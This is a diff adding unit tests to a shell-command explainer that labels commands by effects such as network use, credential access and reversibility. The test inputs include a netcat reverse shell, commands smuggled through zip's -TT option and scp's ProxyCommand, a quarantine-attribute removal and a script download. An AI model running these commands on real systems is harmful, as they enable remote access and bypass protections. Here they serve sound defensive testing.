@@ -21,7 +21,7 @@ describe('lookup', () => {
     const py = run('python3 run.py', '/usr/bin/python3')
     expect(py.key).toBe('python')
     expect(py.facts.source).toBe('name-fallback')
-    expect(run('base64 -d', '/usr/bin/base64').key).toBeNull()
+    expect(run('git2 status', '/usr/bin/git2').key).toBeNull()
   })
 
   it('says plainly when it has no entry, and claims nothing it cannot support', () => {
@@ -89,6 +89,16 @@ describe('escalating flags', () => {
   it('hands the next word to a value flag at the end of a bundle', () => {
     expect(run('curl -sX POST https://example.com').sentence).toBe('Makes a request to example.com and shows what comes back.')
     expect(roles('curl -sX POST https://example.com')).toEqual(['POST:text', 'https://example.com:url'])
+  })
+
+  it('takes an optional value only when it is written onto the flag', () => {
+    expect(roles('make -j4 install')).toEqual(['4:text', 'install:text'])
+    expect(run('make -j4 install').args[0]).toEqual({ index: 1, value: '4', role: 'text', flag: '-j' })
+    // On its own the flag takes nothing, so the next word is still the target.
+    expect(roles('make -j install')).toEqual(['install:text'])
+    expect(explain('make --jobs=4 install').args[0]).toEqual({ index: 1, value: '4', role: 'text', flag: '-j' })
+    // A word that reaches anything but a letter before any value starts is not a bundle, and not one the row read.
+    expect(run('make -1.5 install').unread).toEqual(['-1.5'])
   })
 
   it('reads the rest of a bundle as the value once a letter takes one', () => {
@@ -359,6 +369,55 @@ describe('flags that reach past what the row describes', () => {
     for (const line of ['ssh -L 8080:db:5432 deploy@bastion', 'ssh -D 1080 deploy@bastion']) {
       expect(explain(line).facts.network, line).toBe('listens')
     }
+  })
+
+  it('reads an edit in place, a removed label and a replaced name as changes that stay', () => {
+    const sed = explain("sed -i.bak s/http/https/ site.conf")
+    expect(effectsOf(sed.facts)).toContain('write')
+    expect(sed.facts.reversible).toBe('no')
+    expect(explain('sed s/http/https/ site.conf').facts.opaque).toBe(true)
+
+    const unquarantined = explain('xattr -d com.apple.quarantine /Applications/Tool.app')
+    expect(effectsOf(unquarantined.facts)).toEqual(expect.arrayContaining(['configure', 'delete']))
+    expect(unquarantined.args.map((a) => `${a.value}:${a.role}`)).toEqual(['com.apple.quarantine:text', '/Applications/Tool.app:path'])
+
+    expect(explain('ln -s a b').facts.reversible).toBe('yes')
+    expect(explain('ln -sf a b').facts.reversible).toBe('no')
+  })
+
+  it('names the program a packing tool is told to run', () => {
+    expect(explain("zip -T -TT 'sh -c id' out.zip notes.txt").facts.opaque).toBe(true)
+    expect(explain('sort --compress-program gzip big.txt').facts.opaque).toBe(true)
+    expect(explain('zip out.zip notes.txt').facts.opaque).toBe(false)
+  })
+
+  it('reads the account and scheduling tools as reaching past one command', () => {
+    // Listing the schedule and replacing it read the same: the line cannot say which it is.
+    for (const line of ['crontab -l', 'crontab jobs.txt']) expect(explain(line).facts.opaque, line).toBe(true)
+    expect(explain('dscl . -read /Users/alex').facts.touchesCredentials).toBe(false)
+    expect(explain('dscl . -passwd /Users/alex').facts.touchesCredentials).toBe(true)
+    expect(explain('dscl -u admin -P hunter2 . -read /Users/alex').facts.touchesCredentials).toBe(true)
+    expect(explain('sysadminctl -deleteUser alex').facts.reversible).toBe('no')
+    expect(explain('pbpaste').facts.touchesCredentials).toBe(true)
+  })
+
+  it('reads a signal named as a word as a signal, not as a bundle', () => {
+    expect(roles('pkill -HUP nginx')).toEqual(['nginx:pattern'])
+    expect(roles('pgrep -u root sshd')).toEqual(['root:user', 'sshd:pattern'])
+  })
+
+  it('reads the copying and fetching tools by what they reach', () => {
+    expect(explain('scp -i key.pem notes.txt deploy@bastion:/srv/').facts.touchesCredentials).toBe(true)
+    expect(explain('scp -o ProxyCommand=evil a b:').facts.opaque).toBe(true)
+    expect(effectsOf(explain('rsync -a --delete src/ backup:/srv/').facts)).toContain('delete')
+    expect(explain('rsync -e ssh a b:').facts.opaque).toBe(true)
+    expect(explain('wget -O /tmp/x.sh https://get.example.com').sentence).toBe(
+      'Makes a request to get.example.com and saves what comes back into /tmp/x.sh.',
+    )
+    expect(explain('wget --save-cookies c.txt https://example.com').facts.touchesCredentials).toBe(true)
+    expect(roles('nc -l 8080')).toEqual(['8080:text'])
+    expect(explain('nc -e /bin/sh example.com 4444').facts.opaque).toBe(true)
+    expect(explain('ssh-keygen -R github.com').facts.reversible).toBe('no')
   })
 
   it('reads a curl settings file as able to send and save', () => {
